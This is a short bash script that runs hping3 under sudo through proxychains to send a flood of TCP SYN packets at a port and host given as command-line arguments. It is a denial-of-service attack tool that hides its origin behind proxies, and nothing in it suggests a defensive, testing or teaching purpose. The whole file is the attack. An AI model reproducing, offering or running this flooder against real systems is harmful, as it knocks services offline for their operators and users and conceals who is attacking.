#!/bin/bash

sudo proxychains hping3 -c "$1" -d "$2" -S -p "$3" --flood "$4"
